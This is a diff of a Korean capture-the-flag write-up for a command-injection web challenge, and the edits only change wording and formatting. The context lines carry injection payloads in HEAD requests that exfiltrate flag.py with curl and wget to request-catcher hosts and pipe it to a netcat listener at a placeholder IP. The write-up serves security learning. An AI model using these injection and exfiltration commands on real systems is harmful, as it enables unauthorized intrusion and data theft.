@@ -1,4 +1,4 @@
-<img width="609" alt="image" src="https://github.com/user-attachments/assets/28b587ce-9d23-4409-a4ef-23e20a6c9141"># 문제 설명 및 전체 코드
+# 문제 설명 및 전체 코드
 
 ```
 #!/usr/bin/env python3
@@ -124,7 +124,7 @@ curl https://yzyozog.request.dreamhack.games -d "$(cat flag.py)"
 
 그리고 Burp Suite에서 `HEAD` 메서드로 원격 서버에 요청을 전달할 때는 **URL 인코딩 형식**으로 보내야 하기 때문에 공백은 `+`로 바꿔서 써야 한다.
 
-따라서 아래의 요청을 전달하면 되고, 드림핵 툴즈에 들어가보면 아래와 같이 `cat flag.py`의 결과값이 전송되는 것을 확인할 수 있다.
+따라서 아래의 Payload를 전달하면 되고, 드림핵 툴즈에 들어가보면 아래와 같이 `cat flag.py`의 결과값이 전송되는 것을 확인할 수 있다.
 
 ```
 HEAD /?cmd=curl+https://offxuuz.request.dreamhack.games+-d+"$(cat+flag.py)" HTTP/1.1
@@ -172,7 +172,7 @@ wget https://dzmnkob.request.dreamhack.games --method=POST --body-data="$(cat fl
 HEAD /?cmd=wget+https://dzmnkob.request.dreamhack.games+--method=POST+--body-data="$(cat+flag.py)" HTTP/1.1
 ```
 
-위와 같이 작성한 후 전달하면 아래와 같이 `cat flag.py`의 실행 결과가 원격 서버로 잘 전달되는 것을 확인할 수 있다.
+위와 같이 작성한 후 Payload를 전달하면 아래와 같이 `cat flag.py`의 실행 결과가 원격 서버로 잘 전달되는 것을 확인할 수 있다.
 
 <img width="583" alt="image" src="https://github.com/user-attachments/assets/a77e34f5-f755-4a16-bb4a-3f30f8e5cdc8">
 
@@ -194,7 +194,7 @@ wget https://dzmnkob.request.dreamhack.games/?query="$(cat flag.py)"
 HEAD /?cmd=wget+https://dzmnkob.request.dreamhack.games/?query="$(cat+flag.py)" HTTP/1.1
 ```
 
-이렇게 전달하면, 아래와 같이 QueryString에 실행 결과가 URL 인코딩되어 담겨오는 것을 확인할 수 있다.
+이렇게 Payload를 전달하면, 아래와 같이 QueryString에 실행 결과가 URL 인코딩되어 담겨오는 것을 확인할 수 있다.
 
 <img width="870" alt="image" src="https://github.com/user-attachments/assets/244941fe-6b04-4696-8b0f-644d0de0ded4">
 
@@ -212,17 +212,17 @@ HEAD /?cmd=wget+https://dzmnkob.request.dreamhack.games/?query="$(cat+flag.py)" 
 mkdir static; cat flag.py > static/flag_result.txt
 ```
 
-위 명령어는 먼저 **Static File Directory`인 `/static` 디렉토리를 만들어주고, 해당 디렉토리의 `flag_result.txt` 파일에 `>` 메타 문자를 통해 `cat flag.py`의 출력결과를 저장해준다.
+위 명령어는 먼저 **Static File Directory**인 `/static` 디렉토리를 만들어주고, 해당 디렉토리의 `flag_result.txt` 파일에 `>` 메타 문자를 통해 `cat flag.py`의 출력결과를 저장해준다.
 
 참고로, `>>`은 파일의 맨끝에 추가해주는 메타 문자이며, `flag_result.txt` 파일이 존재하지 않으면 자동으로 생성해준다.
 
-그럼 아래와 같은 페이로드를 전달해주면 된다.
+그럼 아래와 같은 Payload를 전달해주면 된다.
 
 ```
 HEAD /?cmd=mkdir+static;cat+flag.py>static/flag_result.txt HTTP/1.1
 ```
 
-페이로드를 전달해준 후, `http://host3.dreamhack.games:10383/static/flag_result.txt` URL로 들어가게 되면, **Static File Directory**에 존재하는 파일에 접근하기 때문에, 
+Payload를 전달해준 후, `http://host3.dreamhack.games:10383/static/flag_result.txt` URL로 들어가게 되면, **Static File Directory**에 존재하는 파일에 접근하기 때문에, 
 
 `flag_result.txt` 파일의 내용이 아래와 같이 웹 페이지에 출력되는 것을 확인할 수 있다.
 
@@ -240,7 +240,7 @@ nc -lvp [portnum]
 
 위와 같은 명령어를 수행하도록 시스템 함수에 전달해주면 된다.
 
-그럼 간단하게 아래의 페이로드를 보내면 될 것이다.
+그럼 간단하게 아래의 Payload를 보내면 될 것이다.
 
 ```
 HEAD /?cmd=nc+-lvp+[portnum] HTTP/1.1
@@ -260,7 +260,7 @@ cat flag.py | nc [myIP] [portnum]
 
 위와 같은 명령어를 수행하도록 시스템 함수에 전달해주면 된다.
 
-그럼 간단하게 아래의 페이로드를 보내면 될 것이다.
+그럼 간단하게 아래의 Payload를 보내면 될 것이다.
 ```
 HEAD /?cmd=cat+flag.py|nc+[myIP]+[portnum] HTTP/1.1
 ```
